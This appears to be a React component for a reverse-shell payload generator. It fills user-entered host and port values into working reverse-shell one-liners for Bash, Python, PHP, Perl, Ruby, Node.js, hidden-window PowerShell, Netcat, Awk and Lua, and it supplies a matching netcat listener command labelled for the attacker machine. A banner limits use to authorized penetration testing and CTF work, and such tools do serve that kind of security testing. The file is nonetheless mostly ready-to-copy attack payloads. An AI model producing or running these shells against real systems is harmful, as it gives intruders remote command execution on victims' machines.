import { useState } from "react";
import CyberpunkCard from "@/components/CyberpunkCard";
import { Terminal, Copy, Check } from "lucide-react";

interface ShellTemplate {
  language: string;
  payload: (h: string, p: number) => string;
  notes: string;
}

const SHELL_TEMPLATES: Record<string, ShellTemplate> = {
  bash: {
    language: "Bash",
    payload: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
    notes: "Works on most Linux systems with bash installed.",
  },
  "bash-196": {
    language: "Bash (fd196)",
    payload: (h, p) => `0<&196;exec 196<>/dev/tcp/${h}/${p}; sh <&196 >&196 2>&196`,
    notes: "Alternative bash reverse shell using file descriptor 196.",
  },
  python: {
    language: "Python 2",
    payload: (h, p) =>
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'`,
    notes: "Python 2 reverse shell.",
  },
  python3: {
    language: "Python 3",
    payload: (h, p) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'`,
    notes: "Python 3 reverse shell.",
  },
  php: {
    language: "PHP",
    payload: (h, p) =>
      `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    notes: "PHP reverse shell. Requires PHP CLI on the target.",
  },
  perl: {
    language: "Perl",
    payload: (h, p) =>
      `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    notes: "Perl reverse shell. Widely available on Linux/Unix.",
  },
  ruby: {
    language: "Ruby",
    payload: (h, p) =>
      `ruby -rsocket -e 'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    notes: "Ruby reverse shell.",
  },
  nodejs: {
    language: "Node.js",
    payload: (h, p) =>
      `node -e "var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',['-i']);var c=new net.Socket();c.connect(${p},'${h}',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});"`,
    notes: "Node.js reverse shell.",
  },
  powershell: {
    language: "PowerShell",
    payload: (h, p) =>
      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$b=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($b,0,$b.Length);$stream.Flush()};$client.Close()"`,
    notes: "Windows PowerShell reverse shell.",
  },
  nc: {
    language: "Netcat",
    payload: (h, p) => `nc ${h} ${p} -e /bin/sh`,
    notes: "Requires netcat with -e flag (traditional nc, not OpenBSD nc).",
  },
  "nc-mkfifo": {
    language: "Netcat (mkfifo)",
    payload: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
    notes: "Works with OpenBSD netcat (no -e flag). Uses a named pipe.",
  },
  awk: {
    language: "Awk",
    payload: (h, p) =>
      `awk 'BEGIN{s="/inet/tcp/0/${h}/${p}";while(1){do{printf"$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print|&s;close(c)}}while(c!="exit");close(s)}}' /dev/null`,
    notes: "Awk reverse shell. Awk is available on virtually all Unix systems.",
  },
  lua: {
    language: "Lua",
    payload: (h, p) =>
      `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${h}','${p}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
    notes: "Lua reverse shell.",
  },
};

export default function ReverseShellGenerator() {
  const [lhost, setLhost] = useState("10.10.10.10");
  const [lport, setLport] = useState(4444);
  const [shellType, setShellType] = useState("bash");
  const [copied, setCopied] = useState(false);
  const [copiedListener, setCopiedListener] = useState(false);

  const portValid = lport >= 1 && lport <= 65535;
  const hostValid = lhost.trim().length > 0;
  const template = SHELL_TEMPLATES[shellType];
  const payload = template && hostValid && portValid ? template.payload(lhost.trim(), lport) : "";
  const listenerCmd = `nc -lvnp ${lport}`;

  const copy = (text: string, setFn: (v: boolean) => void) => {
    navigator.clipboard.writeText(text).then(() => {
      setFn(true);
      setTimeout(() => setFn(false), 2000);
    });
  };

  return (
    <CyberpunkCard title="REVERSE SHELL GENERATOR">
      <div className="space-y-6">
        {/* Config */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div>
            <label className="block text-xs text-cyber-cyan/70 mb-1 tracking-widest uppercase">LHOST</label>
            <input
              type="text"
              className="w-full bg-black/50 border border-cyber-cyan/30 text-cyber-cyan rounded px-3 py-2 text-sm font-mono focus:outline-none focus:border-cyber-cyan"
              value={lhost}
              onChange={(e) => setLhost(e.target.value)}
              placeholder="10.10.10.10"
            />
          </div>
          <div>
            <label className="block text-xs text-cyber-cyan/70 mb-1 tracking-widest uppercase">LPORT</label>
            <input
              type="number"
              min={1}
              max={65535}
              className="w-full bg-black/50 border border-cyber-cyan/30 text-cyber-cyan rounded px-3 py-2 text-sm font-mono focus:outline-none focus:border-cyber-cyan"
              value={lport}
              onChange={(e) => setLport(Number(e.target.value))}
            />
            {!portValid && <p className="text-red-400 text-xs mt-1">Port must be 1–65535</p>}
          </div>
          <div>
            <label className="block text-xs text-cyber-cyan/70 mb-1 tracking-widest uppercase">SHELL TYPE</label>
            <select
              className="w-full bg-black/50 border border-cyber-cyan/30 text-cyber-cyan rounded px-3 py-2 text-sm font-mono focus:outline-none focus:border-cyber-cyan"
              value={shellType}
              onChange={(e) => setShellType(e.target.value)}
            >
              {Object.entries(SHELL_TEMPLATES).map(([key, val]) => (
                <option key={key} value={key}>{key} ({val.language})</option>
              ))}
            </select>
          </div>
        </div>

        {/* Notes */}
        {template && (
          <div className="bg-yellow-900/20 border border-yellow-500/30 rounded p-3 text-yellow-400 text-xs">
            ℹ️ {template.notes}
          </div>
        )}

        {/* Payload */}
        <div>
          <div className="flex items-center justify-between mb-2">
            <label className="text-xs text-cyber-cyan/70 tracking-widest uppercase">PAYLOAD</label>
            <button
              onClick={() => copy(payload, setCopied)}
              disabled={!payload}
              className="flex items-center gap-1 text-xs text-cyber-cyan border border-cyber-cyan/30 px-2 py-1 rounded hover:bg-cyber-cyan/10 transition-colors disabled:opacity-40"
            >
              {copied ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
              {copied ? "Copied!" : "Copy"}
            </button>
          </div>
          <pre className="bg-black/70 border border-cyber-cyan/20 rounded p-4 text-cyber-cyan text-sm font-mono whitespace-pre-wrap break-all min-h-[80px]">
            {payload || (
              <span className="text-cyber-cyan/30 italic">Fill in LHOST and LPORT to generate payload…</span>
            )}
          </pre>
        </div>

        {/* Listener */}
        <div>
          <div className="flex items-center justify-between mb-2">
            <label className="text-xs text-cyber-cyan/70 tracking-widest uppercase">LISTENER (ATTACKER MACHINE)</label>
            <button
              onClick={() => copy(listenerCmd, setCopiedListener)}
              className="flex items-center gap-1 text-xs text-cyber-cyan border border-cyber-cyan/30 px-2 py-1 rounded hover:bg-cyber-cyan/10 transition-colors"
            >
              {copiedListener ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
              {copiedListener ? "Copied!" : "Copy"}
            </button>
          </div>
          <pre className="bg-black/70 border border-green-500/20 rounded p-4 text-green-400 text-sm font-mono">
            {listenerCmd}
          </pre>
        </div>

        {/* Warning */}
        <div className="bg-red-900/20 border border-red-500/30 rounded p-3 text-red-400 text-xs">
          ⚠️ For authorized penetration testing and CTF use only. Using reverse shells against systems without explicit written permission is illegal.
        </div>
      </div>
    </CyberpunkCard>
  );
}
